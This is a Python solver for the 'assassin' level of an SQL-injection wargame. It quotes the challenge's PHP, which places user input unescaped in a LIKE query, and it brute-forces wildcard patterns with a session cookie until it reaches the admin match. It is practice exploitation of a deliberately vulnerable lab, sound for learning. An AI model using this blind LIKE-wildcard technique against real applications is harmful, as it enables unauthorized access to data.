#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Assassin

    if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("assassin");
    '''

    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    allchars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    find_char = []

    for char in allchars:
        param = dict(pw=f'%{char}%')
        response = los.get_request(url, param, cook)
        if 'Hello guest' in response:
            find_char.append(char)
        if len(find_char) == 2:
            break

    param = dict(pw=f'%{find_char[0]}%{find_char[1]}%')
    response = los.get_request(url, param, cook)
    if 'Clear!' in response:
        print('Assassin Clear!')
    else:
        param = dict(pw=f'%{find_char[1]}%{find_char[0]}%')
        response = los.get_request(url, param, cook)
        if 'Clear!' in response:
            print('Assassin Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
